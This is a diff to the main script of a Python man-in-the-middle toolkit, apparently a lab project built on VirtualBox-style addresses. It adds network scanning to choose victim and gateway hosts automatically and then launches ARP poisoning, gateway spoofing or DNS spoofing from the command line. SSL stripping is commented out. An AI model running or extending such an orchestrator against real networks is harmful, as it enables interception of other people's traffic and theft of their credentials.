@@ -2,64 +2,77 @@ import config
 import arp_poison
 import dns_spoof
 import arp_mitm_gateway
-import ssl_strip
+#import ssl_strip
+import recon
+import os
 import sys
 
+
 def main():
-    interface = 'enp0s3'
-    interfaceNetwork = 'enp0s8'
 
-    print("Interface: {}".format(interface))
+    interfaces = recon.list_interfaces()
 
-    '''
-    macVictim = '08:00:27:CA:16-F1'
-    ipVictim = '10.0.2.5'
-    macServer = '08:00:27:5A:42:20'
-    ipServer = '10.0.2.4'
-    macAttacker = '08:00:27:0b:33:f8'
-    ipAttacker = '10.0.2.6'
-    '''
-    macVictim = '08:00:27:B7:C4:AF'
-    ipVictim = '192.168.56.101'
-    macServer = '08:00:27:CC:08:6F'
-    ipServer = '192.168.56.102'
-    macAttacker = '08:00:27:D0:25:4B'
-    ipAttacker = '192.168.56.103'
+    interfaceLAN = interfaces[1]
+    interfaceNAT = interfaces[2]
+
     
-    ipVictimNetwork = '10.0.2.5' #'10.0.3.10'
-    ipGatewayNetwork = '10.0.2.4' #'10.0.3.2'
-    ipAttackerNetwork = '10.0.2.6' #'10.0.3.15'
-    
+    ipAttackerLAN = recon.get_own_ip_mac_adress(interfaceLAN)['ipAttacker']
+    macAttackerLAN = recon.get_own_ip_mac_adress(interfaceLAN)['macAttacker']
 
-    print("Target IP (M1): {}".format(ipVictim))
-    print("Target MAC (M1): {}\n".format(macVictim))
+    ipAttackerNAT = recon.get_own_ip_mac_adress(interfaceNAT)['ipAttacker']
+    macAttackerNAT = recon.get_own_ip_mac_adress(interfaceNAT)['macAttacker']
 
-    print("Gateway(Server) IP (M2): {}".format(ipServer))
-    print("Gateway(Server) MAC (M2): {}\n".format(macServer))
+    ipGateway = recon.get_gateway()['ipGateway']
+    macGateway = recon.get_gateway()['macGateway']
 
-    print("Attacker IP (M3): {}".format(ipAttacker))    
-    print("Attacker MAC (M3): {}\n".format(macAttacker))
-    
+    devicesListNAT = recon.scan_network(interfaceNAT)
+    ipVictimNAT = devicesListNAT[3]['ip']
+    macVictimNAT = devicesListNAT[3]['mac']
+
+
+    devicesListLAN = recon.scan_network(interfaceLAN)
+    ipVictimLAN = devicesListLAN[0]['ip']
+    macVictimLAN = devicesListLAN[0]['mac']
+    ipServerLAN = devicesListLAN[1]['ip']
+    macServerLAN = devicesListLAN[1]['mac']
+
+
+    # print(recon.scan_network(interfaceNAT))
+    print("Target IP LAN(M1): {}".format(ipVictimLAN))
+    print("Target MAC LAN(M1): {}\n".format(macVictimLAN))
+
+    print("Gateway(Server) LAN IP (M2): {}".format(ipServerLAN))
+    print("Gateway(Server) LAN MAC (M2): {}\n".format(macServerLAN))
+
+    print("Attacker IP (M3) LAN: {}".format(ipAttackerLAN))    
+    print("Attacker MAC (M3) LAN: {}\n".format(macAttackerLAN))
+
+
+    print("Target IP NAT(M1): {}".format(ipVictimNAT))
+    print("Target MAC NAT(M1): {}\n".format(macVictimNAT))
+
+    print("Gateway(Server) NAT IP (M2): {}".format(ipGateway))
+    print("Gateway(Server) NAT MAC (M2): {}\n".format(macGateway))
+
+    print("Attacker IP (M3) NAT: {}".format(ipAttackerNAT))    
+    print("Attacker MAC (M3) NAT: {}\n".format(macAttackerNAT))
+
 
     if len(sys.argv) != 2:
         print("Usage: python main.py [arp|dns|ssl]")
         sys.exit(1)
     if sys.argv[1] == "arp":
         print("ARP Poisoning...")
-        arp_poison.arp_poison(ipVictim, macVictim, ipServer, macAttacker, interface)
-    elif sys.argv[1] == "arp_patient":
-        arp_poison.arp_listener(macAttacker, interface)
-    elif sys.argv[1] == "arp_gateway":
-        arp_mitm_gateway.gateway_spoof(ipGatewayNetwork, \
-                                       ipAttackerNetwork, \
-                                        ipVictimNetwork, \
-                                        interfaceNetwork)
+        arp_poison.arp_poison(ipVictimLAN, macVictimLAN, ipServerLAN, macAttackerLAN, interfaceLAN)
     elif sys.argv[1] == "dns":
         print("DNS spoofing...")
         dns_spoof.dns_spoof()
-    elif sys.argv[1] == "ssl":
-        print("SSL stripping...")
-        ssl_strip.ssl_strip(interface) # pass in interface or network interface?
+    elif sys.argv[1] == "arp_patient":
+        arp_poison.arp_listener(macAttackerLAN, interfaceLAN)
+    elif sys.argv[1] == "arp_gateway":
+        arp_mitm_gateway.spoof(ipGateway, ipAttackerNAT, ipVictimNAT, macGateway, macAttackerNAT, macVictimNAT, interfaceNAT)
+    #elif sys.argv[1] == "ssl":
+        #ssl_strip.start_strip(interface)
     else:
         print("Unknown command: {}. Use either 'arp', 'dns', or 'ssl'".format(sys.argv[1]))
         sys.exit(1)
